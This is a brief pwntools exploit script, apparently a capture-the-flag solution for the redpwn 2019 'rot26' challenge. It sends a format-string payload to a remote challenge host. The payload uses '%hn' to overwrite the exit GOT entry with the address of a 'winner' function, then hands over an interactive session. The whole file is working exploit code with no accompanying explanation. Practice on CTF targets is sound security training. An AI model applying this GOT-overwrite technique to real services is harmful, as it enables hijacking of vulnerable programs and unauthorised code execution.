from pwn import *

e = ELF("./rot26")
#p = process("./rot26")
p = remote("chall.2019.redpwn.net",4003)

winner = 0x8048737
payload = "%34615x".ljust(8)
payload += "%11$hn".ljust(8)
payload += p32(e.got["exit"])
p.sendline(payload)
p.interactive()
